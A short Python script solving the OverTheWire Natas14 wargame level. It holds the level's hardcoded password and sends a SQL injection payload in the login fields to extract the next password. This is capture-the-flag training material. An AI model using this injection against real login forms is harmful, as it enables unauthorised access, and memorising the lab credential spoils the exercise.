# Natas14 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas14.natas.labs.overthewire.org/"

auth_name = 'natas14'
auth_pass = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# A simple SQL injection is enough to get the password
PARAMS = dict(username='"="', password='"="')

# PARAMS puts the data in the URL query string
# DATA is part of the body of a POST request etc.
r = s.get(URL, params=PARAMS)

for x in r.iter_lines():
    if "The password" in x:
        print x